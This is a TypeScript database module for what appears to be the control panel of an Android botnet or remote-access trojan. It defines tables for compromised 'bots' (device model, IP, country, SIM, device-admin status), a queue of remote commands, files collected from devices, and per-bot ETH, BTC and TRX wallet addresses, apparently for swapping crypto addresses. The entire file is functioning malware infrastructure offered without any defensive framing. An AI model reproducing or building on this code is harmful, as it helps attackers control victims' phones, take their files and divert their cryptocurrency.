import initSqlJs from 'sql.js';
import type { Database } from 'sql.js';
import { createRequire } from 'node:module';
import fs from 'node:fs';
import path from 'node:path';
import { config } from './config.js';
import type { BotInfo, Command, WalletSet } from './types.js';

const require = createRequire(import.meta.url);

let db: Database;
let persistTimer: NodeJS.Timeout | null = null;

function persist() {
  if (persistTimer) clearTimeout(persistTimer);
  persistTimer = setTimeout(() => {
    fs.writeFileSync(config.dbPath, Buffer.from(db.export()));
  }, 150);
}

function run(sql: string, params: any[] = []) { db.run(sql, params); persist(); }

function all<T>(sql: string, params: any[] = []): T[] {
  const stmt = db.prepare(sql);
  try {
    stmt.bind(params);
    const rows: T[] = [];
    while (stmt.step()) rows.push(stmt.getAsObject() as T);
    return rows;
  } finally { stmt.free(); }
}

const get = <T>(sql: string, params: any[] = []): T | undefined => all<T>(sql, params)[0];

export async function initDb() {
  const SQL = await initSqlJs({ locateFile: (f) => require.resolve('sql.js/dist/' + f) });
  fs.mkdirSync(path.dirname(config.dbPath), { recursive: true });
  db = fs.existsSync(config.dbPath)
    ? new SQL.Database(fs.readFileSync(config.dbPath))
    : new SQL.Database();
  db.run(`
    CREATE TABLE IF NOT EXISTS bots (
      id TEXT PRIMARY KEY, model TEXT, android TEXT, country TEXT, ip TEXT,
      online INTEGER DEFAULT 0, last_seen INTEGER DEFAULT 0,
      battery INTEGER DEFAULT 0, charging INTEGER DEFAULT 0,
      admin INTEGER DEFAULT 0, version TEXT, sim TEXT, extra TEXT
    );
    CREATE TABLE IF NOT EXISTS commands (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      bot_id TEXT, cmd TEXT, args TEXT,
      status TEXT DEFAULT 'queued', result TEXT, created_at INTEGER
    );
    CREATE TABLE IF NOT EXISTS files (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      bot_id TEXT, name TEXT, size INTEGER, kind TEXT, created_at INTEGER
    );
    CREATE TABLE IF NOT EXISTS wallets (
      bot_id TEXT PRIMARY KEY, eth TEXT, btc TEXT, trx TEXT
    );
    CREATE TABLE IF NOT EXISTS logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      bot_id TEXT, level TEXT, msg TEXT, created_at INTEGER
    );
  `);
  persist();
}

const rowToBot = (r: any): BotInfo => ({
  id: r.id, model: r.model, android: r.android, country: r.country, ip: r.ip,
  online: !!r.online, lastSeen: r.last_seen, battery: r.battery, charging: !!r.charging,
  admin: !!r.admin, version: r.version, sim: r.sim, extra: r.extra || '',
});

export const dbApi = {
  upsertBot(b: BotInfo) {
    run(`INSERT INTO bots (id, model, android, country, ip, online, last_seen, battery, charging, admin, version, sim, extra)
         VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)
         ON CONFLICT(id) DO UPDATE SET model=excluded.model, android=excluded.android,
           country=excluded.country, ip=excluded.ip, online=excluded.online, last_seen=excluded.last_seen,
           battery=excluded.battery, charging=excluded.charging, admin=excluded.admin,
           version=excluded.version, sim=excluded.sim, extra=excluded.extra`,
      [b.id, b.model, b.android, b.country, b.ip, b.online ? 1 : 0, b.lastSeen,
       b.battery, b.charging ? 1 : 0, b.admin ? 1 : 0, b.version, b.sim, b.extra]);
  },
  setOnline(id: string, online: boolean) { run(`UPDATE bots SET online=?, last_seen=? WHERE id=?`, [online ? 1 : 0, Date.now(), id]); },
  listBots(): BotInfo[] { return all<any>(`SELECT * FROM bots ORDER BY last_seen DESC`).map(rowToBot); },
  getBot(id: string): BotInfo | undefined { const r = get<any>(`SELECT * FROM bots WHERE id=?`, [id]); return r ? rowToBot(r) : undefined; },
  deleteBot(id: string) { run(`DELETE FROM bots WHERE id=?`, [id]); },
  queueCmd(botId: string, cmd: string, args = ''): Command {
    run(`INSERT INTO commands (bot_id, cmd, args, status, created_at) VALUES (?,?,?,'queued',?)`, [botId, cmd, args, Date.now()]);
    const row = get<any>(`SELECT * FROM commands WHERE bot_id=? AND cmd=? AND args=? AND created_at=? ORDER BY id DESC LIMIT 1`, [botId, cmd, args, Date.now()]);
    return { id: row.id, botId, cmd, args, status: 'queued', result: null, createdAt: row.created_at };
  },
  queued(botId: string): Command[] { return all<any>(`SELECT * FROM commands WHERE bot_id=? AND status='queued' ORDER BY id LIMIT 50`, [botId]); },
  markSent(id: number) { run(`UPDATE commands SET status='sent' WHERE id=?`, [id]); },
  markDone(id: number, result: string) { run(`UPDATE commands SET status='done', result=? WHERE id=?`, [result, id]); },
  markFailed(id: number, result: string) { run(`UPDATE commands SET status='failed', result=? WHERE id=?`, [result, id]); },
  listCmds(botId: string): Command[] { return all<any>(`SELECT * FROM commands WHERE bot_id=? ORDER BY id DESC LIMIT 200`, [botId]); },
  insertFile(botId: string, name: string, size: number, kind: string) { run(`INSERT INTO files (bot_id, name, size, kind, created_at) VALUES (?,?,?,?,?)`, [botId, name, size, kind, Date.now()]); },
  listFiles(botId: string) { return all<any>(`SELECT * FROM files WHERE bot_id=? ORDER BY id DESC LIMIT 500`, [botId]); },
  getWallet(botId: string): WalletSet | undefined { return get<any>(`SELECT * FROM wallets WHERE bot_id=?`, [botId]); },
  setWallet(botId: string, w: WalletSet) {
    run(`INSERT INTO wallets (bot_id, eth, btc, trx) VALUES (?,?,?,?)
         ON CONFLICT(bot_id) DO UPDATE SET eth=excluded.eth, btc=excluded.btc, trx=excluded.trx`, [botId, w.eth, w.btc, w.trx]);
  },
  addLog(botId: string, level: string, msg: string) { run(`INSERT INTO logs (bot_id, level, msg, created_at) VALUES (?,?,?,?)`, [botId, level, msg, Date.now()]); },
  recentLogs(limit = 100) {
    return all<any>(`SELECT l.id, l.bot_id, l.level, l.msg, l.created_at, b.model
                     FROM logs l LEFT JOIN bots b ON b.id = l.bot_id
                     ORDER BY l.id DESC LIMIT ?`, [limit]);
  },
  stats(): { total: number; online: number } {
    const r = get<any>(`SELECT COUNT(*) AS total, COALESCE(SUM(online),0) AS online FROM bots`)!;
    return { total: r.total, online: r.online };
  },
};
